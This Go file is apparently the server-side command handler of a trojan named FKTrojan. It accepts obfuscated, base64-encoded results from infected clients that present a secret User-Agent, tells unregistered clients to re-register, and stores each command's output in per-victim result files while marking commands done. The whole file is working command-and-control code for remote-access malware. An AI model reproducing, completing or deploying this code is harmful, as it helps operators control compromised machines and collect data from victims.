/*
Author: FreeKnight
*/
//------------------------------------------------------------
package server

import (
	"net/http"
	"strings"
	//"strconv"
	//"io/ioutil"
	"database/sql"
	"fmt"
	"time"
	//"os"
	"FKTrojan/common"
	"path/filepath"
	"strconv"
)

//------------------------------------------------------------
func CommandResponseHandler(response http.ResponseWriter, request *http.Request) {
	if !isEnabled {
		return
	}

	if request.UserAgent() != UserAgentKey {
		return
	}

	request.ParseForm()
	GUID := request.Form.Get("0")
	DATA := request.FormValue("1")
	decode := common.Base64Decode(common.Deobfuscate(DATA))
	tmp := strings.Split(decode, "|") // 客户端UID参数
	FKLog("after decode : " + decode)
	if len(tmp) != 4 {
		FKLog(fmt.Sprintf("len(tmp) = %d", len(tmp)))
		return
	}
	//curTime := tmp[0]			// 处理完的时间
	//common.Md5Hash := tmp[1]			// 原消息的Mash值（用作ID）
	//delete,_ := strconv.ParseBool(tmp[2])	// 是否删除
	//infos := tmp[3]				// 返回用户显示信息

	var tmpguid string
	//files, _ := ioutil.ReadDir("./Profiles/" + GUID + "/Results")
	err := DBPointer.QueryRow("SELECT guid FROM clients WHERE guid=?", GUID).Scan(&tmpguid)
	if err == sql.ErrNoRows {
		FKLog("can not find uid in client table")
		fmt.Fprintf(response, "spin") // 通知客户端进行重注册
		return
	}
	commandID := tmp[1]
	result := time.Now().Format("20060102-15-04-05")
	currentDir := common.CurrentBinaryDir()
	resultFile := filepath.Join(currentDir, "Profiles", GUID, "Results", commandID+"_"+result+".txt")
	FKLog(fmt.Sprintf("writing to file %s", resultFile))
	err = AppendToFile(resultFile, tmp[3])
	FKLog(fmt.Sprintf("writing to file %s err %v", resultFile, err))
	fmt.Fprintf(response, "done")
	isDelete, _ := strconv.ParseBool(tmp[2])
	if isDelete {
		id, _ := strconv.Atoi(commandID)
		DBPointer.Exec("update command set status = ? , file_path = ? where id = ?", common.STATUS_DONE, resultFile, id)
	}
}
